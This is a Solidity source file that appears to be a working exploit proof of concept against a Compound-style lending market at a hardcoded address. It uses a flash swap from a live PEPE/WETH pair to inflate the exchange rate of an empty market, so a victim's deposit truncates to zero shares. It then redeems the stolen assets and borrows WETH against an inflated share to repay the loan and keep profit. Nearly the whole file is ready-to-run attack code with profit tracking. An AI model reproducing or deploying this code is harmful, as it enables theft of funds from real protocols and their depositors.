// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IOErc20Like {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function getCash() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata oTokens) external returns (uint256[] memory);
    function getAllMarkets() external view returns (address[] memory);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract VictimMinter {
    constructor() {}

    function supplyAndMint(address underlying, address market, uint256 amount) external {
        _forceApprove(underlying, market, 0);
        _forceApprove(underlying, market, amount);

        uint256 err = IOErc20Like(market).mint(amount);
        require(err == 0, "victim mint failed");
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}

contract CollateralBorrower {
    constructor() {}

    function mintShare(address underlying, address market, uint256 amount) external {
        _forceApprove(underlying, market, 0);
        _forceApprove(underlying, market, amount);

        uint256 err = IOErc20Like(market).mint(amount);
        require(err == 0, "helper mint failed");
    }

    function enterAndBorrow(
        address comptroller,
        address collateralMarket,
        address borrowMarket,
        uint256 amount,
        address receiver
    ) external returns (bool isNativeBorrow) {
        address[] memory entered = new address[](1);
        entered[0] = collateralMarket;

        IComptrollerLike(comptroller).enterMarkets(entered);

        uint256 err = IOErc20Like(borrowMarket).borrow(amount);
        require(err == 0, "helper borrow failed");

        address borrowUnderlying = _readUnderlying(borrowMarket);
        if (borrowUnderlying == address(0)) {
            (bool sent,) = payable(receiver).call{value: address(this).balance}("");
            require(sent, "native send failed");
            return true;
        }

        _safeTransfer(borrowUnderlying, receiver, amount);
        return false;
    }

    function oTokenBalance(address market) external view returns (uint256) {
        return IOErc20Like(market).balanceOf(address(this));
    }

    function _readUnderlying(address market) internal view returns (address underlying) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSignature("underlying()"));
        if (!ok || data.length < 32) {
            return address(0);
        }
        underlying = abi.decode(data, (address));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    receive() external payable {}
}

contract FlawVerifier {
    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);

    bool public attempted;
    bool public hypothesisValidated;
    uint256 public seedAmountUsed;
    uint256 public helperSeedAmountUsed;
    uint256 public donationAmountUsed;
    uint256 public victimMintAmountUsed;
    uint256 public attackerSharesBeforeRedeem;
    uint256 public redeemedUnderlyingAmount;
    uint256 public flashBorrowAmountUsed;
    uint256 public flashRepaymentInWethUsed;
    address public selectedBorrowMarket;
    bool public selectedBorrowMarketIsNative;
    string public lastFailureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    bool private _inFlashCallback;
    address private _cachedUnderlying;
    address private _cachedWeth;
    uint256 private _expectedFlashBorrow;
    uint256 private _expectedWethRepayment;
    address private _helper;

    constructor() {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address underlying = TARGET.underlying();
        _cachedUnderlying = underlying;

        if (TARGET.totalSupply() != 0) {
            _profitToken = underlying;
            lastFailureReason = "market already has non-zero totalSupply";
            return;
        }

        address weth = _pairedAsset(underlying);
        if (weth == address(0)) {
            _profitToken = underlying;
            lastFailureReason = "configured pair does not contain underlying/WETH route";
            return;
        }
        _cachedWeth = weth;

        _forceApprove(underlying, address(TARGET), 0);
        _forceApprove(underlying, address(TARGET), type(uint256).max);

        // strategy_label=alternate_public_liquidity_route:
        // use a live public PEPE/WETH pair for funding, but keep the exploit root cause unchanged:
        // seed holder -> direct donation -> victim zero-share mint -> attacker redeem.
        _attemptAlternateLiquidityRoute(underlying, weth);
        _updateProfitState(underlying, weth);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(!_inFlashCallback, "callback reentered");

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount == _expectedFlashBorrow, "unexpected flash amount");

        _inFlashCallback = true;

        _runCoreInflationPath(_cachedUnderlying, borrowedAmount);

        // exploit_paths[3]: attacker redeems their existing shares and withdraws both
        // their donation and the victim's deposited assets. The helper-retained share is
        // only an execution detail used to source the public repayment asset after the
        // core redeem path has already been demonstrated.
        uint256 attackerShares = TARGET.balanceOf(address(this));
        attackerSharesBeforeRedeem = attackerShares;
        require(attackerShares > 0, "attacker has no shares");

        uint256 underlyingBeforeRedeem = _balanceOf(_cachedUnderlying, address(this));
        uint256 redeemErr = TARGET.redeem(attackerShares);
        require(redeemErr == 0, "attacker redeem failed");

        uint256 underlyingAfterRedeem = _balanceOf(_cachedUnderlying, address(this));
        redeemedUnderlyingAmount = underlyingAfterRedeem - underlyingBeforeRedeem;
        require(redeemedUnderlyingAmount > 0, "redeem extracted no underlying");

        hypothesisValidated = true;

        bool repaid = _borrowWethAndRepayFlash(_cachedWeth, _expectedWethRepayment);
        require(repaid, "repayment route unavailable");

        _inFlashCallback = false;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptAlternateLiquidityRoute(address underlying, address weth) internal {
        (uint112 reserve0, uint112 reserve1,) = PEPE_WETH_V2_PAIR.getReserves();
        uint256 underlyingReserve;
        uint256 wethReserve;

        if (PEPE_WETH_V2_PAIR.token0() == underlying && PEPE_WETH_V2_PAIR.token1() == weth) {
            underlyingReserve = uint256(reserve0);
            wethReserve = uint256(reserve1);
        } else if (PEPE_WETH_V2_PAIR.token1() == underlying && PEPE_WETH_V2_PAIR.token0() == weth) {
            underlyingReserve = uint256(reserve1);
            wethReserve = uint256(reserve0);
        } else {
            lastFailureReason = "configured pair no longer matches target underlying and WETH";
            return;
        }

        if (underlyingReserve == 0 || wethReserve == 0) {
            lastFailureReason = "alternate public-liquidity pair has zero reserves";
            return;
        }

        uint256 seed = _minimumSeedAmount();
        uint256 minBorrow = (seed * 2) + 2;
        uint256[10] memory divisors = [uint256(2000), 1500, 1000, 750, 500, 250, 100, 50, 25, 10];

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 flashAmount = underlyingReserve / divisors[i];
            if (flashAmount <= minBorrow || flashAmount >= underlyingReserve) {
                continue;
            }

            uint256 wethRepayment = _getCrossTokenRepaymentQuote(flashAmount, underlyingReserve, wethReserve);
            if (wethRepayment == 0) {
                continue;
            }

            flashBorrowAmountUsed = flashAmount;
            flashRepaymentInWethUsed = wethRepayment;
            _expectedFlashBorrow = flashAmount;
            _expectedWethRepayment = wethRepayment;

            bool success = _tryFlashBorrow(underlying, flashAmount);
            if (success) {
                return;
            }
        }

        if (bytes(lastFailureReason).length == 0) {
            lastFailureReason = "no alternate public-liquidity route completed";
        }
    }

    function _runCoreInflationPath(address underlying, uint256 borrowedAmount) internal {
        uint256 seed = _minimumSeedAmount();
        require(seed > 0, "seed is zero");
        require(borrowedAmount > (seed * 2) + 1, "flash amount too small");

        // exploit_paths[0]: attacker mints a minimal amount to become the only oToken holder.
        uint256 mintErr = TARGET.mint(seed);
        require(mintErr == 0, "seed mint failed");
        seedAmountUsed = seed;

        uint256 attackerShares = TARGET.balanceOf(address(this));
        require(attackerShares > 0, "seed mint returned zero shares");

        // Public execution detail:
        // mint one additional minimal share for an attacker-controlled helper before the
        // donation. This does not change the root cause; it only preserves a live share
        // position that can source the public repayment asset after the attacker redeem.
        CollateralBorrower helper = new CollateralBorrower();
        _helper = address(helper);
        _safeTransfer(underlying, address(helper), seed);
        helper.mintShare(underlying, address(TARGET), seed);
        helperSeedAmountUsed = seed;
        require(helper.oTokenBalance(address(TARGET)) > 0, "helper mint returned zero shares");

        uint256 victimDeposit = 1;
        uint256 donation = borrowedAmount - (seed * 2) - victimDeposit;
        require(donation > 0, "donation unavailable");

        // exploit_paths[1]: attacker transfers underlying directly to the market,
        // increasing getCashPrior()/exchangeRate without minting new oTokens.
        _safeTransfer(underlying, address(TARGET), donation);
        donationAmountUsed = donation;

        VictimMinter victim = new VictimMinter();
        _safeTransfer(underlying, address(victim), victimDeposit);
        victimMintAmountUsed = victimDeposit;

        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
        uint256 cashBeforeVictimMint = TARGET.getCash();

        // exploit_paths[2]: victim calls mint() and mintTokens truncates to zero.
        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);

        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
        uint256 cashAfterVictimMint = TARGET.getCash();
        require(victimSharesAfter == victimSharesBefore, "victim received shares");
        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
    }

    function _borrowWethAndRepayFlash(address weth, uint256 wethRepayment) internal returns (bool) {
        address comptroller = TARGET.comptroller();
        if (comptroller == address(0) || _helper == address(0)) {
            lastFailureReason = "helper or comptroller unavailable";
            return false;
        }

        (address borrowMarket, bool isNativeBorrowMarket) = _findRepaymentMarket(comptroller, weth);
        if (borrowMarket == address(0)) {
            lastFailureReason = "no live WETH or native-ETH borrow market discovered";
            return false;
        }

        selectedBorrowMarket = borrowMarket;
        selectedBorrowMarketIsNative = isNativeBorrowMarket;

        uint256 extraProfit = 1e15;
        uint256[5] memory premiums = [uint256(1e17), 5e16, 1e16, 5e15, 0];
        uint256 cash = IOErc20Like(borrowMarket).getCash();

        for (uint256 i = 0; i < premiums.length; ++i) {
            uint256 targetBorrow = wethRepayment + extraProfit + premiums[i];
            if (targetBorrow > cash) {
                continue;
            }

            try CollateralBorrower(payable(_helper)).enterAndBorrow(
                comptroller,
                address(TARGET),
                borrowMarket,
                targetBorrow,
                address(this)
            ) returns (bool borrowedNative) {
                _repayFlashInWeth(weth, wethRepayment, borrowedNative);
                return true;
            } catch {
                continue;
            }
        }

        if (wethRepayment <= cash) {
            try CollateralBorrower(payable(_helper)).enterAndBorrow(
                comptroller,
                address(TARGET),
                borrowMarket,
                wethRepayment,
                address(this)
            ) returns (bool borrowedNative) {
                _repayFlashInWeth(weth, wethRepayment, borrowedNative);
                lastFailureReason = "borrow route only broke even";
                return true;
            } catch {
                lastFailureReason = "unable to borrow WETH against retained inflated share";
                return false;
            }
        }

        lastFailureReason = "borrow market cash insufficient for flash repayment";
        return false;
    }

    function _findRepaymentMarket(address comptroller, address desiredUnderlying)
        internal
        view
        returns (address market, bool isNative)
    {
        address[] memory markets;
        try IComptrollerLike(comptroller).getAllMarkets() returns (address[] memory listed) {
            markets = listed;
        } catch {
            return (address(0), false);
        }

        address nativeCandidate;
        for (uint256 i = 0; i < markets.length; ++i) {
            address candidate = markets[i];
            if (candidate == address(TARGET)) {
                continue;
            }

            address underlying = _readUnderlying(candidate);
            if (underlying == desiredUnderlying) {
                return (candidate, false);
            }
            if (underlying == address(0) && nativeCandidate == address(0)) {
                nativeCandidate = candidate;
            }
        }

        return (nativeCandidate, nativeCandidate != address(0));
    }

    function _readUnderlying(address market) internal view returns (address underlying) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSignature("underlying()"));
        if (!ok || data.length < 32) {
            return address(0);
        }
        underlying = abi.decode(data, (address));
    }

    function _tryFlashBorrow(address underlying, uint256 amount) internal returns (bool) {
        try this._flashBorrowExternal(underlying, amount) {
            return true;
        } catch Error(string memory reason) {
            lastFailureReason = reason;
            return false;
        } catch {
            lastFailureReason = "flash route reverted";
            return false;
        }
    }

    function _flashBorrowExternal(address underlying, uint256 amount) external {
        require(msg.sender == address(this), "self only");
        _flashBorrow(underlying, amount);
    }

    function _flashBorrow(address underlying, uint256 amount) internal {
        address token0 = PEPE_WETH_V2_PAIR.token0();
        address token1 = PEPE_WETH_V2_PAIR.token1();

        if (token0 == underlying) {
            PEPE_WETH_V2_PAIR.swap(amount, 0, address(this), hex"01");
            return;
        }
        if (token1 == underlying) {
            PEPE_WETH_V2_PAIR.swap(0, amount, address(this), hex"01");
            return;
        }

        revert("configured pair does not contain underlying");
    }

    function _pairedAsset(address underlying) internal view returns (address) {
        address token0 = PEPE_WETH_V2_PAIR.token0();
        address token1 = PEPE_WETH_V2_PAIR.token1();

        if (token0 == underlying) {
            return token1;
        }
        if (token1 == underlying) {
            return token0;
        }
        return address(0);
    }

    function _minimumSeedAmount() internal view returns (uint256) {
        uint256 exchangeRate = TARGET.exchangeRateStored();
        uint256 seed = exchangeRate / 1e18;
        if (exchangeRate % 1e18 != 0) {
            seed += 1;
        }
        if (seed == 0) {
            seed = 1;
        }
        return seed;
    }

    function _getCrossTokenRepaymentQuote(
        uint256 amountOut,
        uint256 reserveOut,
        uint256 reserveIn
    ) internal pure returns (uint256) {
        if (amountOut == 0 || reserveOut <= amountOut || reserveIn == 0) {
            return 0;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _updateProfitState(address underlying, address weth) internal {
        uint256 underlyingBalance = _balanceOf(underlying, address(this));
        if (underlyingBalance > 0) {
            _profitToken = underlying;
            _profitAmount = underlyingBalance;
            return;
        }

        uint256 wethBalance = _balanceOf(weth, address(this));
        if (wethBalance > 0) {
            _profitToken = weth;
            _profitAmount = wethBalance;
            return;
        }

        if (address(this).balance > 0) {
            _profitToken = address(0);
            _profitAmount = address(this).balance;
            return;
        }

        _profitToken = underlying;
        _profitAmount = 0;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }

        amount = abi.decode(data, (uint256));
    }

    function _repayFlashInWeth(address weth, uint256 wethRepayment, bool borrowedNative) internal {
        if (borrowedNative) {
            require(address(this).balance >= wethRepayment, "insufficient native for wrap");
            IWETHLike(weth).deposit{value: wethRepayment}();
        }

        _safeTransfer(weth, address(PEPE_WETH_V2_PAIR), wethRepayment);
    }

    receive() external payable {}
}
